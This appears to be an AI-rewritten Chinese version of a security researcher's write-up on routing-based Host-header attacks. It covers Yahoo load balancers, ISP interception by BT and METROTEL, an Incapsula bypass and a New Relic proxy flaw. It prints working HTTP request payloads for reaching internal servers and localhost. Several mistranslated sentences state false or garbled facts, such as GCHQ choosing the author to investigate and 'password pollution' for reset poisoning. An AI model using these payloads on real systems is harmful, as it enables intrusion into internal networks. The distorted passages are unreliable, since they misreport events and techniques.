### 优化后的文本

---

**HTTP请求与响应示例**

```
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082
Content-Length: 34
```

**请求内容**
```
GET proxy.config.alarm_email
```

**响应**
```
HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:57:02 GMT
Transfer-Encoding: chunked
Connection: keep-alive
Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
proxy.config.alarm_email = "PI:EMAIL"
```

通过使用`SET`命令，可以对雅虎的负载均衡器池进行广泛的配置更改，包括启用SOCKS代理和授予特定IP地址权限，直接将项目推送到缓存中。发现并报告了此问题后，雅虎为我的贡献提供了15,000美元的奖励。几周后，ZGrab管道发现了另一台具有相同漏洞的服务器，因此我获得了额外的5,000美元奖励。

### 调查对象 - BT (英国电信)

在尝试错误的主机技术时，我发现某些攻击载荷发送到完全不相关的公司（如cloud.mail.ru）时，它们的pingbacks都来自一小块IP地址。最初假设这些公司可能共同使用相同的云WAF解决方案，但实际上这些服务器被欺骗，将请求错误地路由到内部管理界面。反向DNS解析显示这些IP地址属于BT（英国电信）。从英国肯特发送攻击载荷到俄罗斯，却收到快速响应，这表明流量被本地ISP拦截。进一步测试确认，发送到443端口的流量并未受到保护，暗示存在中间人篡改行为。

为了验证这一点，我使用Burp Repeater调试，并通过Traceroute追踪，发现TCP连接被我的ISP终止。GCHQ（英国政府通信总部）选择我来深入调查这些异常数据包。最终，我发现该系统主要用于版权保护内容的访问控制。黑名单IP的流量会被重路由到代理池，以检查HTTP Host头并显示“访问已屏蔽”的消息。

### 调查对象 - METROTEL (哥伦比亚ISP)

类似的行为也发生在哥伦比亚ISP（METROTEL）。Rapid7的Sonar项目使用了一个公共的METROTEL DNS服务器，该服务器选择性地对特定域名进行DNS污染，导致流量重定向到DPI代理服务器。为了通过HTTPS流量而不导致证书错误，他们嗅探了SNI字段。通知Rapid7后，我们识别出一些目标主机，主要是图像和视频网站以及一些不知名的社交网络。访问这些网站时，会被重定向到一个提示页面，说明因包含虐待儿童图片而被屏蔽。此外，该DNS服务器还会对特定新闻网站（如bbc.co.uk）进行查找污染，可能是为了屏蔽或篡改某些新闻内容。

### 处理输入

如果认为上述事件是偶然的错误，请看接下来的七台服务器池的情况。当这些服务器收到以下请求时：

```
GET / HTTP/1.1
Host: burpcollaborator.net
Connection: close
```

它们会对外发送如下请求：

```
GET /burpcollaborator.net/burpcollaborator.net HTTP/1.1
Host: outage.burpcollaborator.net
Via: o2-b.ycpi.tp2.yahoo.net
```

这种行为难以预测，唯一合理的应对措施是确保服务器能够处理客户端的异常行为。虽然这种特殊行为看起来无法利用，但如果注册了带外域名（如outage.yourdomain.com）并将其解析到内部IP地址，则有可能利用规范路径将请求发送到内部服务器的webroot：

```
GET / HTTP/1.1
Host: ../?x=.vcap.me
Connection: close
```

这会导致以下请求：

```
GET /vcap.me/../?=x=.vcap.me
Host: outage.vcap.me
Via: o2-b.ycpi.tp2.yahoo.net
```

在路径正常化后，URL变为`http://outage.vcap.me/?x=whatever`。由于vcap.me的所有子域名都解析到`127.0.0.1`，这个请求相当于访问本地主机。

### 主机覆盖

另一种类似的技术是通过密码污染来重置邮件，在美国国防部的某台服务器上生效。这是因为有些服务器对Host头进行了白名单设置，但却忽略了请求行中的优先级：

```
GET http://internal-website.mil/ HTTP/1.1
Host: xxxxxxx.mil
Connection: close
```

利用这一漏洞，我获得了访问多个有趣网站的权限，包括一个攻击面库和文件传输服务。

### 奇怪的请求

有些目标隐藏在Incapsula的基于云的Web应用WAF后面。Incapsula依赖于检测Host头来判断请求转发的目标服务器，但只要是在Incapsula指定的端口上，它都会解析Host头。这意味着以下请求会被路由到`incapsula-client.net`：

```
GET / HTTP/1.1
Host: incapsula-client.net:PI:EMAIL
Connection: close
```

Incapsula-client.net的后台会将此输入转换为链接`http://incapsula-client.net:PI:EMAIL/`，导致后台尝试使用用户名`incapsula-client.net`和密码`80`来授权`burp-collaborator.net`。这不仅暴露了新的攻击面，还揭示了服务器的位置，使我绕过了Incapsula的保护，直接访问后端系统。

### 出乎意料

坏掉的请求路由漏洞并不总是由配置错误引起。例如，在New Relic基础设施上的代码片段就导致了严重的漏洞：

```java
Url backendURL = "http://public-backend/";
String uri = ctx.getRequest().getRawUri();
URI proxyUri;
try {
    proxyUri = new URIBuilder(uri)
            .setHost(backendURL.getHost())
            .setPort(backendURL.getPort())
            .setScheme(backendURL.getScheme())
            .build();
} catch (URISyntaxException e) {
    Util.sendError(ctx, 400, INVALID_REQUEST_URL);
    return;
}
```

这段代码看似没有问题，首先接受用户输入的URL，然后用硬编码的后端域名替换。不幸的是，Apache HttpComponents服务器库不要求路径以`/`开头，这意味着如果我发送以下请求：

```
GET @burp-collaborator.net/ HTTP/1.1
```

可能会导致意外的路径解析和安全风险。

---

希望以上优化后的文本更加清晰、连贯和专业。如果有任何进一步的修改需求，请随时告知。